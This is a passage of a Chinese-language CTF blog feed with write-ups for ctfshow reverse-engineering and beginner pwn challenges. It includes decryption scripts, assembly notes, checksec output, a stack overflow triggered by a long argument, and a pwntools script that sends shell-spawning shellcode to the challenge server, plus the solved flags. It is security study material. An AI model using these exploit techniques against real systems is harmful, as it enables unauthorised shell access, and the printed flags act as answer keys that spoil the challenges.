href="http://t.csdnimg.cn/14ygR">http://t.csdnimg.cn/14ygR</a></p><p>文件头：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00</span><br><span class="line">B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 F8 00 00 00</span><br></pre></td></tr></table></figure><p>主要是这个：<img src="https://img-blog.csdnimg.cn/20201213104311755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NsYzExMTI=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="一个西瓜切两半你一半我一半"><a href="#一个西瓜切两半你一半我一半" class="headerlink" title="一个西瓜切两半你一半我一半"></a>一个西瓜切两半你一半我一半</h3><p>没想到key是” 一个西瓜切两半你一半我一半“愣愣用之前的key，怪不得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: GBK -*-</span></span><br><span class="line"></span><br><span class="line">crypt = <span class="string">&quot;乃乾觅甯剏乳厡侻丨厏扝乌博丿乜规甲剌乶厝侥丿卻扚丠厘丿乎覟瓬剤&quot;</span></span><br><span class="line">key = <span class="string">&quot;一个西瓜切两半你一半我一半&quot;</span></span><br><span class="line">tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(crypt)):</span><br><span class="line">    tmp += <span class="built_in">chr</span>((<span class="built_in">ord</span>(crypt[i]) - <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">0x110000</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h3><p>?暴力？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">CTF=<span class="string">&#x27;ctfshow&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decript</span>(<span class="params">L,n,password,k</span>):</span><br><span class="line">    T=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        j=i%k</span><br><span class="line">        T.append(L[i]^(<span class="number">0xff</span>-password[j]))</span><br><span class="line">    res=<span class="built_in">bytes</span>(T)</span><br><span class="line">    <span class="keyword">return</span> CTF <span class="keyword">in</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute</span>(<span class="params">fname</span>):</span><br><span class="line">    f=<span class="built_in">open</span>(fname,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    exe=f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    offset=<span class="number">0x2040</span></span><br><span class="line">    n=<span class="number">622</span></span><br><span class="line">    code=exe[offset:offset+n]</span><br><span class="line">    L=<span class="built_in">list</span>(code)</span><br><span class="line">    charset=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0x41</span>,<span class="number">0x41</span>+<span class="number">26</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0x61</span>,<span class="number">0x61</span>+<span class="number">26</span>))</span><br><span class="line">    R=[]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">                r=decript(L,n,[a,b,c],<span class="number">3</span>)</span><br><span class="line">                <span class="comment">#print(a,b,c,r)</span></span><br><span class="line">                <span class="keyword">if</span> r:</span><br><span class="line">                    s=<span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)</span><br><span class="line">                    <span class="built_in">print</span>(s,<span class="string">&#x27;is ok!!!&#x27;</span>)</span><br><span class="line">                    R.append(s)</span><br><span class="line">    <span class="built_in">print</span>(R)</span><br><span class="line">               </span><br><span class="line"></span><br><span class="line">brute(<span class="string">&#x27;ctfshow01.exe&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h3><p>我以为是非预期的预期：</p><p>43544653686f777b5468616e6b5f43544653484f575f536b797d</p><p>43 54 46 53 68 6f 77 7b 54 68 61 6e 6b 5f 43 54 46 53 48 4f 57 5f 53 6b 79 7d</p><p>CTFShow{Thank_CTFSHOW_Sky}</p><p>（不过我都看到这个了，还没联想Crypto第二题那个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">647669776d757e83817372816e707479707c888789757c92788d84838b878d9d</span><br></pre></td></tr></table></figure><h3 id="E"><a href="#E" class="headerlink" title="E"></a>E</h3><p>不是？我连断点都没下，直接出flag？</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240709150257703.png" alt="image-20240709150257703"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;西瓜杯&quot;&gt;&lt;a href=&quot;#西瓜杯&quot; class=&quot;headerlink&quot; title=&quot;西瓜杯&quot;&gt;&lt;/a&gt;西瓜杯&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://ctf.show/challenges#%E8%A5%BF%E7%93%9C%E6%9D%AF%E</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>pwn30--52</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/06/03/ppwn/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/06/03/ppwn/</id>
    <published>2024-06-02T16:00:00.000Z</published>
    <updated>2024-09-16T08:03:41.637Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN-study"><a href="#PWN-study" class="headerlink" title="PWN-study"></a>PWN-study</h1><h3 id="pwn0"><a href="#pwn0" class="headerlink" title="pwn0"></a>pwn0</h3><p>用户名为 ctfshow 密码 为 123456  # 注意密码不是ctfshow</p><p>请使用 ssh软件连接 <code>ssh ctfshow@题目地址 -p题目端口号</code></p><h3 id="pwn1-4"><a href="#pwn1-4" class="headerlink" title="pwn1-4"></a>pwn1-4</h3><ul><li>system(cat &#x2F;ctfshow_flag)</li><li>pwd–ls–cat</li><li>反编译看结果（实际不用（</li><li>有点逆向味道，找到比较字符串，明文存储。但是记得，没有回显&#x2F;。。</li></ul><h2 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h2><h3 id="pwn5-12"><a href="#pwn5-12" class="headerlink" title="pwn5-12"></a>pwn5-12</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line">// eax = 114514</span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line">//edx=0x36D</span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line">//ecx=0x80490E8</span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line">//eax=0x636C6557</span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line">//eax=ome_to_CTFshow_PWN</span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line">//eax=ome_to_CTFshow_PWN</span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line">//eax=ome_to_CTFshow_PWN</span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>**pwn9:**那么080490E8地址单元中的值就为：636C6557h，后面的h表示给数值是16进制。所以本条代码执行后eax寄存器中的值就为636C6557h。 所以本题的flag为：ctfshow{0x636C6557} </p><p>使用 nasm 命令对该汇编文件进行编译，指定输出格式为 ELF 格式，这种格式是一种在 UNIX 系统中广泛使用的可执行文件格式，它包含了程序的二进制代码、数据、符号表等信息。 <strong>nasm -f elf Welcome_to_CTFshow.asm</strong> 将该文件链接成可执行文件 <strong>ld -m elf_i386 -s -o Welcome_to_CTFshow Welcome_to_CTFshow.o</strong> ld: 这是 GNU 链接器的命令。</p><p>-m elf_i386: 这个选项指定链接器工作在 i386 架构下，生成针对 ELF 格式的目标文件。i386 是 Intel 的 32 位架构。</p><p>-s: 这个选项告诉链接器在生成的可执行文件中去除符号表和调试信息，以减小文件大小。</p><p>-o Welcome_to_CTFshow: 这个选项指定生成的可执行文件的文件名为 Welcome_to_CTFshow。</p><p>Welcome_to_CTFshow.o: 这是要链接的输入文件，是由汇编器生成的对象文件，它包含了汇编代码的已编译二进制表示。 checksec Welcome_to_CTFshow 选中使用快捷键 A 将数据转换为字符串</p><h2 id="二进制文件基础"><a href="#二进制文件基础" class="headerlink" title="二进制文件基础"></a>二进制文件基础</h2><h3 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h3><p>gcc -o flag flag.c———-ctfshow{hOw_t0_us3_GCC?}</p><h3 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h3><p>&#x2F;&#x2F;&#x2F;链接文件</p><p>echo CTFshow &gt; key # 创建内容为CTFshow的key文件 gcc -o flag .&#x2F;flag.c # 编译flag.c .&#x2F;flag #运行flag文件那flag</p><h3 id="pwn15"><a href="#pwn15" class="headerlink" title="pwn15"></a>pwn15</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 flag.asm # 将flag.asm编译成64为.o文件</span><br><span class="line">ld -s -o flag flag.o # 将flag.o链接成flag可执行文件</span><br><span class="line">./flag # 运行flag可执行文件拿到flag</span><br></pre></td></tr></table></figure><h3 id="pwn16"><a href="#pwn16" class="headerlink" title="pwn16"></a>pwn16</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o flag flag.s # 将flag.s编译成flag可执行文件</span><br><span class="line">./flag # 运行flag可执行文件拿到flag</span><br></pre></td></tr></table></figure><h3 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17"></a>pwn17</h3><p>限制了我们输入字符串的长度为9,system(“&#x2F;bin&#x2F;sh”);是可以获得Linux的交互式shell的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">cat /ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="Linux相关基础命令"><a href="#Linux相关基础命令" class="headerlink" title="Linux相关基础命令"></a>Linux相关基础命令</h2><h3 id="pwn18"><a href="#pwn18" class="headerlink" title="pwn18"></a>pwn18</h3><p>echo &gt;&gt; 两个&gt;表示追加</p><p>echo &gt; 一个&gt;表示覆盖</p><h3 id="pwn19"><a href="#pwn19" class="headerlink" title="pwn19"></a>pwn19</h3><p>关闭了输出流</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// attributes: thunk</span><br><span class="line">__pid_t fork(void)</span><br><span class="line">&#123;</span><br><span class="line">  return fork();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 &gt;&amp;0定向到输入流</p><p>输入命令’pwd &gt;&amp;0’之后，给我们返回了&#x2F;，代表我们所处根路径。</p><p>再重新nc连接(因为这个程序给我们执行命令的环境不是交互式的，所以我们需要再次nc连接执行命令)，使用ls &gt;&amp;0查看根目录。</p><p>再使用cat ctfshow_flag &gt;&amp;0</p><h2 id="Linux安全机制"><a href="#Linux安全机制" class="headerlink" title="Linux安全机制"></a>Linux安全机制</h2><h3 id="got-plt"><a href="#got-plt" class="headerlink" title=".got  .plt"></a>.got  .plt</h3><p>》<a href="http://t.csdnimg.cn/NfKt8">http://t.csdnimg.cn/NfKt8</a></p><p><strong>运行时重定位</strong></p><p><strong>这个地址在链接时要修正，它的修正值是根据printf地址（更确切的叫法应该是符号，链接器眼中只有符号，没有所谓的函数和变量）来修正，它的修正方式按相对引用方式</strong>。这个过程称为<strong>链接时重定位</strong></p><p>printf是在glibc动态库定位，或者是在其它.o定义这两种情况下，它都能工作。如果是在其它.o中定义了printf函数，那在链接阶段，printf地址已经确定，可以直接重定位。如果printf定义在动态库内（链接阶段是可以知道printf在哪定义的，只是如果定义在动态库内不知道它的地址而已），链接阶段无法做重定位。</p><p>存放函数地址的数据表，称为<strong>重局偏移表</strong>（GOT, Global Offset Table），而那个额外代码段表，称为<strong>程序链接表</strong>（PLT，Procedure Link Table）。<strong>它们两姐妹各司其职，联合出手上演这一出运行时重定位好戏</strong>。</p><p><img src="https://img-blog.csdn.net/20160611124517413" alt="PLT和GOT原理雏形"></p><p>当然这个原理图并不是Linux下的PLT&#x2F;GOT真实过程，Linux下的PLT&#x2F;GOT还有更多细节要考虑了。这个图只是将这些躁声全部消除，让大家明确看到PLT&#x2F;GOT是如何穿针引线的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checksec 文件</span><br><span class="line">当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。</span><br><span class="line">当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。</span><br><span class="line">当RELRO为No RELRO时，表示.got与.got.plt都可写。</span><br></pre></td></tr></table></figure><h3 id="pwn20"><a href="#pwn20" class="headerlink" title="pwn20"></a>pwn20</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">readelf -S pwn</span><br><span class="line">[Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line"> [21] .got              PROGBITS         0000000000600f18  00000f18</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000600f28  00000f28</span><br><span class="line">       0000000000000030  0000000000000008  WA       0     0     8</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>ctfshow{1_1_0x600f18_0x600f28}</p><h3 id="pwn21"><a href="#pwn21" class="headerlink" title="pwn21"></a>pwn21</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ checksec ppwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ppwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ readelf -S ppwn     </span><br><span class="line">  [21] .got              PROGBITS         0000000000600ff0  00000ff0</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000030  0000000000000008  WA       0     0     8</span><br></pre></td></tr></table></figure><h3 id="pwn22"><a href="#pwn22" class="headerlink" title="pwn22"></a>pwn22</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ checksec pwwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/pwwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ readelf -S pwwn</span><br><span class="line">x  [12] .plt              PROGBITS         0000000000400450  00000450</span><br><span class="line">       0000000000000040  0000000000000010  AX       0     0     16</span><br><span class="line">  [21] .got              PROGBITS         0000000000600fc0  00000fc0</span><br><span class="line">       0000000000000040  0000000000000008  WA       0     0     8</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>ctfshow{0_0_0x600fc0}</p><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><h3 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h3><p>ctfshow函数是一个可以利用栈溢出的<a href="https://so.csdn.net/so/search?q=strcpy%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">strcpy函数</a>，我们就要尽可能的输入更多的字符串以让程序发生溢出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ./pwnme aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Linux_Security_Mechanisms                               </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : No canary found                                         </span><br><span class="line">    * *************************************                           </span><br><span class="line">How to input ?</span><br><span class="line">ctfshow&#123;1c6bbef8-addb-4f20-a6ce-512f3684d46f&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h3><h5 id="题目提示使用pwntools的shellcraft模块进行攻击，因此直接编写exp"><a href="#题目提示使用pwntools的shellcraft模块进行攻击，因此直接编写exp" class="headerlink" title="题目提示使用pwntools的shellcraft模块进行攻击，因此直接编写exp"></a>题目提示使用pwntools的shellcraft模块进行攻击，因此直接编写exp</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28274)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ python</span><br><span class="line">Python 2.7.17 (default, Mar  8 2023, 18:40:28) </span><br><span class="line">[GCC 7.5.0] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; p = remote(&quot;pwn.challenge.ctf.show&quot;,28274)</span><br><span class="line">[x] Opening connection to pwn.challenge.ctf.show on port 28274</span><br><span class="line">[x] Opening connection to pwn.challenge.ctf.show on port 28274: Trying 124.223.158.81</span><br><span class="line">[+] Opening connection to pwn.challenge.ctf.show on port 28274: Done</span><br><span class="line">&gt;&gt;&gt; payload = asm(shellcraft.sh())</span><br><span class="line">&gt;&gt;&gt; p.sendline(payload)</span><br><span class="line">&gt;&gt;&gt; p.interactive()</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Linux_Security_Mechanisms                               </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : NX disabled &amp; Has RWX segments                          </span><br><span class="line">    * *************************************                           </span><br><span class="line">jhh///sh/bin��h••••�4$ri••1�Qj•Y•�Q��1�j</span><br><span class="line">                                        X̀</span><br><span class="line">���F</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">ctfshow_flag</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">pwn</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">start.sh</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">cat ctfshow_flag</span><br><span class="line">ctfshow&#123;c9ed6187-a6c6-40ae-a2b6-77d5a628be4b&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h3><h5 id="开启NX保护，或许可以试试ret2libc"><a href="#开启NX保护，或许可以试试ret2libc" class="headerlink" title="开启NX保护，或许可以试试ret2libc"></a><strong>开启NX保护，或许可以试试ret2libc</strong></h5><p><a 